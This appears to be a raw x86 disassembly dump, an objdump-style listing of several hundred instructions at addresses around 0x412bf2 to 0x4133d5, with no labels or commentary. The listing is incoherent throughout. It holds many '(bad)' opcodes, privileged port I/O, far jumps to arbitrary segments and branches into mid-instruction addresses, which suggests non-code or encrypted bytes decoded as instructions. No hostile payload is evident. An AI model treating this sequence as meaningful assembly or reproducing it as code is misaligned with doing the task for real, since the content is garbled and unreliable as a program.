  412bf2:	jge    0x412ba6
  412bf4:	out    dx,al
  412bf5:	xchg   esp,eax
  412bf6:	lea    edi,[edi-0x3d]
  412bf9:	les    ecx,FWORD PTR [esi+0x40]
  412bfc:	xor    edi,DWORD PTR [esi+0x6c410466]
  412c02:	hlt    
  412c03:	mov    ecx,0xa1fab480
  412c08:	call   0x1a111c37
  412c0d:	mov    WORD PTR [eax-0x5a8c120a],cs
  412c13:	div    DWORD PTR [edi]
  412c15:	cdq    
  412c16:	cld    
  412c17:	call   0x2363949c
  412c1c:	jo     0x412bbc
  412c1e:	mov    ebx,0xa26ccd
  412c23:	rcl    BYTE PTR [eax+0x2b],1
  412c26:	pop    es
  412c27:	adc    eax,0x9d8b3a59
  412c2c:	idiv   DWORD PTR [esi-0x7435b5d5]
  412c32:	sbb    dl,BYTE PTR [edi-0x3b463368]
  412c38:	out    dx,eax
  412c39:	jne    0x412c1e
  412c3b:	adc    edi,DWORD PTR [edi-0x7088bb65]
  412c41:	arpl   WORD PTR [ebx-0x605323c9],sp
  412c47:	sub    bh,BYTE PTR [eax-0x7b909117]
  412c4d:	jo     0x412c0a
  412c4f:	push   0x886659ab
  412c54:	in     eax,dx
  412c55:	pop    ebp
  412c56:	dec    edi
  412c57:	mov    ds:0x4b132e9e,al
  412c5c:	mov    ecx,0x47e165b1
  412c61:	loope  0x412c35
  412c63:	cmp    esi,DWORD PTR [edi-0x3b0609cb]
  412c69:	dec    esp
  412c6a:	lods   eax,DWORD PTR ds:[esi]
  412c6b:	fdiv   QWORD PTR [esp+edx*8]
  412c6e:	pop    ds
  412c6f:	(bad)  
  412c70:	jmp    0xd281:0xb410e344
  412c77:	jb     0x412c29
  412c79:	push   esp
  412c7a:	test   eax,0x3b569d23
  412c7f:	in     eax,0x10
  412c81:	loope  0x412c2b
  412c83:	pushf  
  412c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c85:	push   ecx
  412c86:	imul   esi,DWORD PTR [esi+edi*8+0x11],0x3c
  412c8b:	out    dx,al
  412c8c:	call   0xf9bd8bf
  412c91:	sbb    eax,0x1829a699
  412c96:	adc    al,0xd4
  412c98:	pusha  
  412c99:	sbb    BYTE PTR [edx-0x69],dh
  412c9c:	std    
  412c9d:	loop   0x412d0d
  412c9f:	adc    ebx,DWORD PTR [eax]
  412ca1:	mov    edx,DWORD PTR [eax]
  412ca3:	push   0x77f9d067
  412ca8:	js     0x412cb1
  412caa:	mov    al,ds:0x4f1524f6
  412caf:	sub    BYTE PTR [esi-0x3],dh
  412cb2:	jbe    0x412cfc
  412cb4:	cmp    dh,ah
  412cb6:	xor    DWORD PTR ds:0xecd77343,esi
  412cbc:	fidivr WORD PTR [ebx]
  412cbe:	adc    bl,BYTE PTR [esi+0x2e]
  412cc1:	dec    eax
  412cc2:	sar    BYTE PTR [edi],1
  412cc4:	mov    edi,0x64776e38
  412cc9:	in     eax,dx
  412cca:	dec    edx
  412ccb:	pop    esi
  412ccc:	ins    DWORD PTR es:[edi],dx
  412ccd:	ret    0xb37b
  412cd0:	loopne 0x412c66
  412cd2:	das    
  412cd3:	aaa    
  412cd4:	add    DWORD PTR ds:0xdda84f6a,esi
  412cda:	sbb    cl,0xf0
  412cdd:	out    0x7,eax
  412cdf:	and    al,0xbc
  412ce1:	xor    ecx,DWORD PTR [edx+0x5d]
  412ce4:	push   0x8652b552
  412ce9:	repnz xor eax,0x6877e24e
  412cef:	(bad)
  412cf2:	mov    BYTE PTR [ecx+0x14331232],0xcd
  412cf9:	dec    eax
  412cfa:	shl    DWORD PTR ds:[ebx],1
  412cfd:	data16 sti 
  412cff:	stc    
  412d00:	(bad)  
  412d02:	mov    ebp,0x3b79945a
  412d07:	inc    esi
  412d08:	hlt    
  412d09:	push   esp
  412d0a:	sbb    edi,DWORD PTR [edx+0x65]
  412d0d:	nop
  412d0e:	mov    edi,0x4a414ebc
  412d13:	fwait
  412d14:	inc    esp
  412d15:	pop    eax
  412d16:	pop    ds
  412d17:	mov    bh,0x6
  412d19:	xchg   ebx,eax
  412d1a:	or     al,0xd9
  412d1c:	mov    bh,0xbf
  412d1e:	push   ss
  412d1f:	adc    ch,BYTE PTR [edx]
  412d21:	cmp    al,0x83
  412d23:	lea    edi,gs:[ebp+0x5]
  412d27:	adc    esi,esi
  412d29:	cmp    ecx,DWORD PTR [edi+esi*8-0x358d6c0a]
  412d30:	adc    DWORD PTR [eax+0x3ceeedaf],esi
  412d36:	jne    0x412d73
  412d38:	das    
  412d39:	clc    
  412d3a:	pop    eax
  412d3b:	and    eax,0x968357df
  412d40:	adc    ecx,0xb2d7df8e
  412d46:	mov    ds:0xbae90306,al
  412d4b:	mov    cl,0x13
  412d4d:	add    eax,0xfdcf9e55
  412d52:	sbb    eax,0x1f8a2541
  412d57:	scas   eax,DWORD PTR es:[edi]
  412d58:	mov    bl,bl
  412d5a:	rol    BYTE PTR [eax-0x5c],1
  412d5d:	or     al,0xa4
  412d5f:	fistp  QWORD PTR [ebp+0x521d09c8]
  412d65:	sub    eax,0x6f9b88cb
  412d6a:	mov    edi,0x109b5492
  412d6f:	popa   
  412d70:	push   eax
  412d71:	sbb    al,dl
  412d73:	rcl    DWORD PTR [edx+0x58],0xf0
  412d77:	int    0x39
  412d79:	push   0x5e1a9f8
  412d7e:	jbe    0x412de4
  412d80:	(bad)
  412d84:	adc    BYTE PTR ds:0x4548c6d3,ah
  412d8a:	jae    0x412d8a
  412d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d8d:	xor    al,BYTE PTR [eax-0x516d9a3e]
  412d93:	call   0x1200:0xc3e5ac1c
  412d9a:	push   ebx
  412d9b:	es js  0x412d81
  412d9e:	sub    BYTE PTR [ebp-0x14f04035],ah
  412da4:	pop    edi
  412da5:	jnp    0x412d71
  412da7:	std    
  412da8:	repnz xor ch,bl
  412dab:	or     BYTE PTR [edx-0x6e],cl
  412dae:	js     0x412dad
  412db0:	ja     0x412e04
  412db2:	lds    ebp,FWORD PTR [edx-0x1c5f499a]
  412db8:	mov    BYTE PTR [eax+0x3],bh
  412dbb:	imul   ecx,DWORD PTR [eax+0x6c],0xdd122f36
  412dc2:	daa    
  412dc3:	lea    esi,[ebp+0xe01711b]
  412dc9:	popf   
  412dca:	stc    
  412dcb:	xor    eax,0x86b6e9f4
  412dd0:	pop    edi
  412dd1:	pusha  
  412dd2:	dec    ebp
  412dd3:	lock sar edx,cl
  412dd6:	push   ebp
  412dd7:	inc    edx
  412dd8:	repnz fcmovu st,st(5)
  412ddb:	add    eax,0xf0e4911e
  412de0:	lds    esp,FWORD PTR [eax+0xd20b05b]
  412de6:	dec    edx
  412de7:	inc    ebp
  412de8:	retf   0xffb3
  412deb:	dec    edi
  412dec:	push   esp
  412ded:	retf   
  412dee:	test   BYTE PTR [eax],dl
  412df0:	js     0x412df2
  412df2:	xlat   BYTE PTR ds:[ebx]
  412df3:	in     eax,dx
  412df4:	fld    TBYTE PTR [ebp-0x42]
  412df7:	xor    BYTE PTR [eax],bl
  412df9:	loopne 0x412d82
  412dfb:	gs push cs
  412dfd:	jl     0x412dc5
  412dff:	in     eax,0xf1
  412e01:	mov    al,ds:0xa7e68cb8
  412e06:	inc    esp
  412e07:	mov    esp,gs
  412e09:	pop    ecx
  412e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e0b:	mov    ds:0x8be06032,eax
  412e10:	cli    
  412e11:	jmp    0x74ed:0xf6fde2fb
  412e18:	arpl   dx,bx
  412e1a:	jnp    0x412e90
  412e1c:	test   eax,0xe41aa7da
  412e21:	test   BYTE PTR [edx-0x18],al
  412e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e25:	xor    edx,ebx
  412e27:	cmp    DWORD PTR [edx-0x8],esi
  412e2a:	hlt    
  412e2b:	lahf   
  412e2c:	sub    bh,bh
  412e2e:	shl    DWORD PTR [ecx],1
  412e30:	imul   ebp,DWORD PTR [eax+ecx*4-0x71],0x57
  412e35:	jp     0x412e1e
  412e37:	push   ebx
  412e38:	xlat   BYTE PTR ds:[ebx]
  412e39:	dec    esp
  412e3a:	in     al,0x25
  412e3c:	or     esp,DWORD PTR [ebp+0x6]
  412e3f:	jne    0x412ea4
  412e41:	xor    esi,DWORD PTR [ebx+0x2488b987]
  412e47:	mov    eax,0xf9bd9196
  412e4c:	jne    0x412e1d
  412e4e:	aas    
  412e4f:	and    DWORD PTR [ebp+0x1f],eax
  412e52:	xor    BYTE PTR [ebx-0x27],bh
  412e55:	or     eax,ecx
  412e57:	ficomp DWORD PTR [eax+0x13]
  412e5a:	jge    0x412ec1
  412e5c:	sbb    DWORD PTR [ebx+0x43],0x62a5598f
  412e63:	outs   dx,BYTE PTR ds:[esi]
  412e64:	xor    DWORD PTR [ebp+0x79],ebp
  412e67:	xchg   edi,eax
  412e68:	mov    bl,0x29
  412e6a:	pop    eax
  412e6b:	add    esi,eax
  412e6d:	and    al,0x22
  412e6f:	mov    eax,0x1800ca91
  412e74:	and    DWORD PTR [esi-0x4ca776b9],ecx
  412e7a:	and    dh,bl
  412e7c:	dec    esi
  412e7d:	sbb    ah,BYTE PTR ds:0x7cd739a2
  412e83:	gs repnz es xchg edx,eax
  412e87:	outs   dx,BYTE PTR ds:[esi]
  412e88:	dec    esp
  412e89:	xchg   ebp,eax
  412e8a:	push   0xffffffcd
  412e8c:	in     eax,dx
  412e8d:	jns    0x412f0a
  412e8f:	je     0x412e2e
  412e91:	or     DWORD PTR [edi+0x5c226637],ebx
  412e97:	(bad)  
  412e98:	adc    ebx,DWORD PTR [eax]
  412e9a:	inc    BYTE PTR [ecx+0x1e9a4b86]
  412ea0:	fbstp  TBYTE PTR [esp+edi*4-0x764db862]
  412ea7:	or     DWORD PTR [ebp+0x3d],edi
  412eaa:	pop    ecx
  412eab:	and    eax,0x2751a813
  412eb0:	push   esp
  412eb1:	mov    dh,0x24
  412eb3:	ss (bad) 
  412eb5:	retf   
  412eb6:	in     al,0xfe
  412eb8:	mov    al,ds:0x84646730
  412ebd:	mov    ch,0x7d
  412ebf:	arpl   WORD PTR [ebx-0x44],sp
  412ec2:	fbstp  TBYTE PTR [edx+0x2093cf67]
  412ec8:	fcmovu st,st(5)
  412eca:	adc    DWORD PTR [ebp-0x17],ebp
  412ecd:	mov    DWORD PTR [esi-0x30038362],esp
  412ed3:	inc    esp
  412ed4:	add    bh,BYTE PTR [esi]
  412ed6:	inc    edx
  412ed7:	fst    DWORD PTR [ebp+0x281ddd8a]
  412edd:	mov    cs,WORD PTR [esi-0x2d]
  412ee0:	lods   eax,DWORD PTR ds:[esi]
  412ee1:	js     0x412ec2
  412ee3:	int    0x7b
  412ee5:	xchg   DWORD PTR [edx+0x5ff4b25c],edi
  412eeb:	retf   
  412eec:	fild   DWORD PTR [edx+0x54]
  412eef:	repnz out 0xd9,eax
  412ef2:	(bad)  
  412ef3:	and    al,0x18
  412ef5:	lods   al,BYTE PTR ds:[esi]
  412ef6:	push   ds
  412ef7:	std    
  412ef8:	lock aaa 
  412efa:	sub    eax,0x651413b2
  412eff:	sahf   
  412f00:	(bad)  
  412f01:	icebp  
  412f02:	mov    edx,0xd0c9cb77
  412f07:	and    bh,bh
  412f09:	xor    eax,0xe40dc803
  412f0e:	jmp    0x9585:0x47dc3fd6
  412f15:	call   0x89a7:0x262a9c64
  412f1c:	rol    eax,1
  412f1e:	jo     0x412f74
  412f20:	add    BYTE PTR cs:[eax+edx*4+0x10],al
  412f25:	stos   BYTE PTR es:[edi],al
  412f26:	lods   al,BYTE PTR ds:[esi]
  412f27:	(bad)  
  412f28:	cmp    al,0xb5
  412f2a:	push   esi
  412f2b:	(bad)  
  412f2c:	mov    eax,0x4c4980cc
  412f31:	sub    al,BYTE PTR [edx-0x4e52be6f]
  412f37:	jg     0x412f41
  412f39:	stos   DWORD PTR es:[edi],eax
  412f3a:	sub    bh,ah
  412f3c:	std    
  412f3d:	(bad)  
  412f3e:	fiadd  DWORD PTR [ebx+esi*4-0x68]
  412f42:	add    al,0x7f
  412f44:	mov    eax,DWORD PTR [ebx+0x2047f9c2]
  412f4a:	dec    esp
  412f4b:	hlt    
  412f4c:	ins    DWORD PTR es:[edi],dx
  412f4d:	(bad)
  412f50:	(bad)  
  412f52:	in     eax,dx
  412f53:	and    dl,BYTE PTR [esi+0x54]
  412f56:	cs jae 0x412f8f
  412f59:	inc    ecx
  412f5a:	and    bh,ch
  412f5c:	ror    ebx,cl
  412f5e:	push   ss
  412f5f:	js     0x412f86
  412f61:	retf   0x5eb0
  412f64:	push   esi
  412f65:	repz adc ch,BYTE PTR [edx+0x6c7be23e]
  412f6c:	cmc    
  412f6d:	aad    0xf
  412f6f:	inc    eax
  412f70:	pop    ds
  412f71:	cmp    edx,ebp
  412f73:	pushf  
  412f74:	mov    al,0xc7
  412f76:	rcr    DWORD PTR [edi],0x22
  412f79:	xor    bl,BYTE PTR [ebp-0x6d]
  412f7c:	aad    0x0
  412f7e:	dec    eax
  412f7f:	mov    ds:0x5ebf6f2,eax
  412f84:	jecxz  0x412fa9
  412f86:	jno    0x412fb8
  412f88:	mov    ds:0x6c0cda86,eax
  412f8d:	inc    edx
  412f8e:	jmp    0x81b85093
  412f93:	add    al,0xda
  412f95:	pop    ds
  412f96:	mov    ebp,0x17974cc7
  412f9b:	xchg   ebp,eax
  412f9c:	(bad)  
  412f9d:	sti    
  412f9e:	add    ebx,DWORD PTR [ecx+0x7d]
  412fa1:	xchg   ecx,eax
  412fa2:	lahf   
  412fa3:	dec    edi
  412fa4:	pop    es
  412fa5:	fs (bad) 
  412fa8:	test   ebx,esp
  412faa:	inc    ebp
  412fab:	sub    BYTE PTR [edi],bh
  412fad:	jae    0x412f7f
  412faf:	arpl   WORD PTR [ebp+0x4d],si
  412fb2:	xchg   esp,eax
  412fb3:	push   esp
  412fb4:	mov    edi,0xf597766d
  412fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fba:	sub    eax,0x8bd546b1
  412fbf:	ds mov cl,0x6c
  412fc2:	sub    edi,0xffffffbf
  412fc5:	(bad)  
  412fc6:	xchg   edi,eax
  412fc7:	mov    dh,0x31
  412fc9:	sahf   
  412fca:	inc    ebx
  412fcb:	xchg   edx,eax
  412fcc:	or     DWORD PTR [ecx+0x14162dc4],ebx
  412fd2:	and    dl,BYTE PTR [edi-0x4]
  412fd5:	jg     0x412fba
  412fd7:	je     0x412f72
  412fd9:	jns    0x41304a
  412fdb:	xchg   DWORD PTR ds:0x5f69ff78,ecx
  412fe1:	mul    DWORD PTR [esi+0x22]
  412fe4:	push   ss
  412fe5:	push   ebx
  412fe6:	loopne 0x412ffc
  412fe8:	jb     0x413008
  412fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412feb:	test   al,bh
  412fed:	loop   0x412fa4
  412fef:	push   edi
  412ff0:	adc    eax,0x91445278
  412ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff6:	pop    esp
  412ff7:	mov    DWORD PTR [edi],esi
  412ff9:	mov    cl,0x94
  412ffb:	xor    DWORD PTR [eax-0x2c],ebp
  412ffe:	in     eax,0x26
  413000:	push   ebx
  413001:	or     esp,edi
  413003:	xor    esp,esi
  413005:	hlt    
  413006:	mov    bl,0xd6
  413008:	(bad)  
  413009:	jp     0x413021
  41300b:	push   dx
  41300d:	ds push esi
  41300f:	xlat   BYTE PTR ds:[ebx]
  413010:	fisub  DWORD PTR [ebx+0x4d]
  413013:	adc    DWORD PTR [edi+eiz*1-0x3d],eax
  413017:	clc    
  413018:	stos   BYTE PTR es:[edi],al
  413019:	dec    ebx
  41301a:	daa    
  41301b:	(bad)  
  41301d:	adc    DWORD PTR [edx+0x17],esi
  413020:	int    0x99
  413022:	jae    0x413009
  413024:	sti    
  413025:	shl    DWORD PTR [edx],1
  413027:	and    cl,BYTE PTR [ecx-0xc1ac3b7]
  41302d:	xchg   ecx,eax
  41302e:	jmp    DWORD PTR fs:[ebx]
  413031:	ficomp WORD PTR [ecx]
  413033:	pop    edx
  413034:	dec    edx
  413035:	call   0x94be:0x74a7a8b8
  41303c:	mov    al,0x27
  41303e:	dec    esi
  41303f:	mov    ds:0x167fee6e,eax
  413044:	sbb    cl,BYTE PTR [edi]
  413046:	adc    DWORD PTR [esi-0x52],edx
  413049:	aas    
  41304a:	jl     0x412fce
  41304c:	aaa    
  41304d:	arpl   WORD PTR [ebx-0x78ce1edd],ax
  413053:	pop    edx
  413054:	ss fs sti 
  413057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413058:	cmp    edi,esi
  41305a:	mov    esi,0xf9f033f3
  41305f:	and    dl,BYTE PTR ds:0xff70463a
  413065:	push   ss
  413066:	das    
  413067:	scas   eax,DWORD PTR es:[edi]
  413068:	mov    eax,0x35ee7441
  41306d:	jp     0x412ffd
  41306f:	test   ch,dh
  413071:	jbe    0x413058
  413073:	pop    es
  413074:	push   esp
  413075:	mov    ds:0xbd7ffbfb,eax
  41307a:	lock call FWORD PTR gs:[eax+ebx*8]
  41307f:	and    DWORD PTR [eax+0x578f2425],esi
  413085:	and    eax,0xea0617bb
  41308a:	sub    cl,ah
  41308c:	or     DWORD PTR [edx],0x654850e3
  413092:	mov    cl,0xbc
  413094:	outs   dx,BYTE PTR ds:[esi]
  413095:	lock into 
  413097:	add    al,cl
  413099:	add    ch,al
  41309b:	sti    
  41309c:	inc    ebp
  41309d:	mov    ah,0x56
  41309f:	inc    edx
  4130a0:	add    eax,edx
  4130a2:	or     BYTE PTR [ebp+edx*8+0x11],al
  4130a6:	pusha  
  4130a7:	or     BYTE PTR [esi+edx*1-0x755b0957],0x84
  4130af:	iret   
  4130b0:	lods   al,BYTE PTR ds:[esi]
  4130b1:	js     0xf76f0560
  4130b7:	xchg   edi,eax
  4130b8:	and    DWORD PTR [esi+0x19],esp
  4130bb:	push   0xffffffd8
  4130bd:	and    eax,0x82dd4021
  4130c2:	sahf   
  4130c3:	pushf  
  4130c4:	push   ds
  4130c5:	cmp    dh,BYTE PTR [ebx]
  4130c7:	mov    bl,0xbf
  4130c9:	xlat   BYTE PTR ds:[ebx]
  4130ca:	out    dx,al
  4130cb:	pop    eax
  4130cc:	mov    ds:0x5af08040,eax
  4130d1:	push   0x2b
  4130d3:	xor    esi,DWORD PTR [edx]
  4130d5:	inc    esi
  4130d6:	inc    eax
  4130d7:	sahf   
  4130d8:	out    0xa,al
  4130da:	test   DWORD PTR [ecx],edx
  4130dc:	xor    edi,DWORD PTR [eax+0x61]
  4130df:	push   esi
  4130e0:	enter  0x524f,0x70
  4130e4:	add    ah,BYTE PTR [esi+0x2377bd2]
  4130ea:	clc    
  4130eb:	mov    cs,WORD PTR [ebx+0x21267dc8]
  4130f1:	imul   esp,DWORD PTR [ecx+0x138e90f5],0xd
  4130f8:	jno    0x41315b
  4130fa:	test   eax,0xb4d31601
  4130ff:	(bad)  
  413100:	mov    ebp,0xf23dbf17
  413105:	mov    ds:0x836e8c33,al
  41310a:	stos   BYTE PTR es:[edi],al
  41310b:	sub    eax,0xd473fad0
  413110:	mov    eax,0x587092b8
  413115:	lods   al,BYTE PTR ds:[esi]
  413116:	push   0x4d
  413118:	rcr    DWORD PTR [edi],0x94
  41311b:	or     esp,esp
  41311d:	retf   
  41311e:	dec    eax
  41311f:	out    0xcc,al
  413121:	cld    
  413122:	mov    ebx,0x616027a2
  413127:	icebp  
  413128:	call   0x8fac:0x6f20907e
  41312f:	(bad)  
  413130:	mov    dh,0x98
  413132:	(bad)  
  413134:	aas    
  413135:	or     dh,BYTE PTR [edx]
  413137:	(bad)  
  413138:	div    BYTE PTR [ebx-0x196890eb]
  41313e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41313f:	mov    ds:0x82542ea5,al
  413144:	dec    edi
  413145:	cld    
  413146:	arpl   WORD PTR [ebx-0x60],bp
  413149:	xchg   esi,eax
  41314a:	inc    ebp
  41314b:	mov    al,ds:0xe16e0d21
  413150:	fs mov ebp,0x57c52fa0
  413156:	cmp    al,0xd0
  413158:	sub    DWORD PTR [ebp-0x46dabcdc],esi
  41315e:	lahf   
  41315f:	aaa    
  413160:	push   eax
  413161:	lea    edx,[ecx-0xf]
  413164:	or     eax,0x959ca5e6
  413169:	add    dl,ch
  41316b:	mov    al,ds:0x3c698ef2
  413170:	or     al,0x7
  413172:	shr    DWORD PTR [ebx],cl
  413174:	shr    DWORD PTR [esi+0x4d],1
  413177:	dec    ebx
  413178:	pop    eax
  413179:	xadd   ebp,eax
  41317c:	pop    esi
  41317d:	dec    ebp
  41317e:	xchg   edx,eax
  41317f:	dec    ebx
  413180:	repnz lea esp,[esi+0x32]
  413184:	xchg   ebp,eax
  413185:	and    ecx,DWORD PTR [esp+ecx*1]
  413188:	sbb    esp,DWORD PTR [ecx]
  41318a:	lahf   
  41318b:	popa   
  41318c:	js     0x413121
  41318e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41318f:	xchg   BYTE PTR [ebx],al
  413191:	sub    DWORD PTR [eax+0xd97ad3b],0xb982ef56
  41319b:	rep gs stos BYTE PTR es:[edi],al
  41319e:	iret   
  41319f:	imul   ebp
  4131a1:	mov    edx,ss
  4131a3:	icebp  
  4131a4:	push   ebx
  4131a5:	pusha  
  4131a6:	inc    esp
  4131a7:	mov    bh,0xd0
  4131a9:	push   esp
  4131aa:	mov    esi,0x30dc282c
  4131af:	leave  
  4131b0:	jg     0x4131f6
  4131b2:	push   eax
  4131b3:	jl     0x413177
  4131b5:	dec    esi
  4131b6:	jno    0x413217
  4131b8:	fdiv   QWORD PTR [eax-0x2842df8f]
  4131be:	adc    DWORD PTR [ebx],eax
  4131c0:	(bad)
  4131c4:	sbb    cl,BYTE PTR ds:[ebp+0x783f7d81]
  4131cb:	out    0xa2,eax
  4131cd:	mov    DWORD PTR [ecx+eiz*4],esi
  4131d0:	aam    0xa5
  4131d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131d3:	loopne 0x413158
  4131d5:	sahf   
  4131d6:	and    cl,0xf7
  4131d9:	mov    ch,BYTE PTR [eax+0xe981bfa]
  4131df:	ret    
  4131e0:	add    al,0x2b
  4131e2:	mov    al,BYTE PTR [esi+0x33ca4db9]
  4131e8:	out    0x7d,al
  4131ea:	test   DWORD PTR [edi+0x65],esp
  4131ed:	sbb    eax,0xeb8a3b29
  4131f2:	add    bh,ch
  4131f4:	les    edx,FWORD PTR [esi+0x6d5e665f]
  4131fa:	sub    bh,BYTE PTR [esi-0x7fb0f6b9]
  413200:	ja     0x4131d8
  413202:	iret   
  413203:	jge    0x413233
  413205:	fstp   TBYTE PTR [edx]
  413207:	xchg   edx,eax
  413208:	ror    BYTE PTR [eax],1
  41320a:	cli    
  41320b:	add    ch,dh
  41320d:	ret    
  41320e:	sub    esp,DWORD PTR [ecx-0x65]
  413211:	fcmovnb st,st(2)
  413213:	xlat   BYTE PTR ds:[ebx]
  413214:	adc    bl,BYTE PTR [ebp-0x4fc90fda]
  41321a:	and    al,0x2a
  41321c:	add    al,BYTE PTR [esp+ebx*4-0x53]
  413220:	xchg   ebx,eax
  413221:	clc    
  413222:	or     eax,0x15fca73f
  413227:	jne    0x41323a
  413229:	pop    ecx
  41322a:	call   0x26725a1f
  41322f:	mov    eax,ds:0x93827ca9
  413234:	mov    bl,0x28
  413236:	xchg   esp,eax
  413237:	dec    eax
  413238:	mov    ah,0xf
  41323a:	out    dx,al
  41323b:	push   ebx
  41323c:	addr16 xor al,0x23
  41323f:	jnp    0x4131ff
  413241:	cmp    DWORD PTR [ecx],esp
  413243:	stos   DWORD PTR es:[edi],eax
  413244:	dec    ebx
  413245:	gs jb  0x4131ee
  413248:	les    esi,FWORD PTR [ecx+0x21bd65de]
  41324e:	or     al,0x9b
  413250:	jmp    DWORD PTR [edi+0x59713693]
  413256:	jg     0x413201
  413258:	push   es
  413259:	ins    BYTE PTR es:[edi],dx
  41325a:	sbb    DWORD PTR [eax+0x7e],ecx
  41325d:	add    DWORD PTR [ecx],esi
  41325f:	in     eax,0x26
  413261:	test   al,0xd6
  413263:	pop    es
  413264:	and    BYTE PTR [esi],al
  413266:	mov    edi,edx
  413268:	dec    ebp
  413269:	out    dx,eax
  41326a:	or     BYTE PTR es:[eax+esi*2-0x2eb5d72a],al
  413272:	fldcw  WORD PTR [eax+0x70]
  413275:	outs   dx,BYTE PTR ds:[esi]
  413276:	rcr    DWORD PTR fs:[ebx],1
  413279:	fisttp QWORD PTR [ecx+edi*8+0x30c33e93]
  413280:	enter  0xeb61,0x1
  413284:	push   0x33462586
  413289:	mov    cl,0x78
  41328b:	inc    esp
  41328c:	test   al,0x8d
  41328e:	(bad)  
  41328f:	cld    
  413290:	ficomp DWORD PTR [edi-0x47]
  413293:	mov    WORD PTR [ebx-0x2a16fc19],fs
  413299:	xor    bh,BYTE PTR [eax+ebx*4]
  41329c:	outs   dx,DWORD PTR ds:[esi]
  41329d:	mov    dh,0xc0
  41329f:	push   0xffffffb0
  4132a1:	pop    ss
  4132a2:	test   eax,0xde4439d7
  4132a7:	cmp    bl,BYTE PTR [eax]
  4132a9:	(bad)
  4132ac:	mov    ah,0xb9
  4132ae:	mov    ebx,DWORD PTR [edi-0x4f]
  4132b1:	test   eax,0xbc8a1e4c
  4132b6:	or     eax,0xe4d1300a
  4132bb:	outs   dx,BYTE PTR ds:[esi]
  4132bc:	push   ebx
  4132bd:	push   ss
  4132be:	loopne 0x41327b
  4132c0:	pop    ebp
  4132c1:	and    dl,al
  4132c3:	in     eax,0xa6
  4132c5:	xchg   ebp,eax
  4132c6:	jb     0x41327c
  4132c8:	pop    ss
  4132c9:	cwde   
  4132ca:	inc    ecx
  4132cb:	data16 stc 
  4132cd:	sar    DWORD PTR [edi],0x7f
  4132d0:	xor    DWORD PTR [edi+0x7404cc9c],ebx
  4132d6:	mov    ds:0xe082eaa7,eax
  4132db:	lods   eax,DWORD PTR gs:[esi]
  4132dd:	les    edx,FWORD PTR [edi-0x39990e9c]
  4132e3:	es popf 
  4132e5:	pop    ds
  4132e6:	sub    eax,eax
  4132e8:	hlt    
  4132e9:	jmp    0x4559:0x1e32bfcb
  4132f0:	not    DWORD PTR [eax+0x5eb66a31]
  4132f6:	pushf  
  4132f7:	ror    dl,cl
  4132f9:	xlat   BYTE PTR ds:[ebx]
  4132fa:	dec    ecx
  4132fb:	pop    esp
  4132fc:	(bad)  [ebx]
  4132fe:	xor    dl,BYTE PTR ds:[ebp-0x63]
  413302:	lods   eax,DWORD PTR ds:[esi]
  413303:	inc    esi
  413304:	inc    edx
  413305:	popf   
  413306:	mov    ch,0x3b
  413308:	dec    edx
  413309:	jno    0x413309
  41330b:	ds dec edi
  41330d:	add    ah,ah
  41330f:	stos   BYTE PTR es:[edi],al
  413310:	xor    al,0x7f
  413312:	mov    esi,ss
  413314:	outs   dx,BYTE PTR ds:[esi]
  413315:	pop    es
  413316:	push   ecx
  413317:	cmp    BYTE PTR ds:0x82ab2820,ch
  41331d:	int3   
  41331e:	push   esp
  41331f:	out    0x21,al
  413321:	jns    0x413364
  413323:	inc    ebx
  413324:	sbb    cl,dl
  413326:	sub    al,0x7d
  413328:	jmp    0xff23:0x839115dd
  41332f:	pop    ebx
  413330:	push   esi
  413331:	(bad)  
  413332:	xor    esp,DWORD PTR [eax-0x74]
  413335:	xor    eax,DWORD PTR [esi+edx*1-0x76]
  413339:	pop    es
  41333a:	dec    ebp
  41333b:	xchg   ebx,ecx
  41333d:	push   es
  41333e:	mov    WORD PTR [ebp+0x25],ds
  413341:	xor    al,0x51
  413343:	adc    BYTE PTR ds:0xad2af9a1,dh
  413349:	ins    BYTE PTR es:[di],dx
  41334b:	lock jnp 0x41339e
  41334e:	es nop
  413350:	scas   al,BYTE PTR es:[edi]
  413351:	inc    esp
  413352:	cmp    eax,DWORD PTR [ebx+eiz*2+0x20aca2ab]
  413359:	dec    ecx
  41335a:	test   dl,dh
  41335c:	repnz mov ds:0x60a1bb42,al
  413362:	test   eax,0x968299a5
  413367:	xchg   ecx,eax
  413368:	inc    edi
  413369:	jbe    0x41336d
  41336b:	jns    0x413331
  41336d:	cwde   
  41336e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336f:	shl    DWORD PTR [ecx-0x61],0xca
  413373:	cmp    BYTE PTR [ebx],bl
  413375:	gs mov cl,0xe6
  413378:	adc    eax,0x873ec73b
  41337d:	imul   eax,DWORD PTR [edx+eiz*2-0x2b],0x1421f370
  413385:	sbb    eax,0x1b337f87
  41338a:	inc    ecx
  41338b:	into   
  41338c:	mov    gs,WORD PTR [ecx-0x60]
  41338f:	mov    ah,0x23
  413391:	loopne 0x413363
  413393:	adc    BYTE PTR [edx+0x6b63493a],0x47
  41339a:	mov    dh,0xc9
  41339c:	inc    ecx
  41339d:	in     al,0xe9
  41339f:	adc    eax,edi
  4133a1:	pop    esp
  4133a2:	cmp    al,0x6d
  4133a4:	pop    ds
  4133a5:	mov    esp,0xef2e01a6
  4133aa:	xchg   DWORD PTR [edi+0x15c5305],ebp
  4133b0:	and    eax,0xdbc3b5a7
  4133b5:	and    edx,DWORD PTR [eax+0x5e139120]
  4133bb:	adc    ebp,eax
  4133bd:	pop    ecx
  4133be:	imul   edi,DWORD PTR [edi],0x3
  4133c1:	fdivr  QWORD PTR [ebx+0x18]
  4133c4:	mov    bh,0xd0
  4133c6:	dec    esi
  4133c7:	dec    edi
  4133c8:	cmp    eax,0x836f25ad
  4133cd:	cmp    ch,BYTE PTR [eax-0x68]
  4133d0:	jmp    0x413392
  4133d2:	(bad)  [esp+esi*1]
  4133d5:	imul   esi,DWORD PTR [eax],0xffffffab
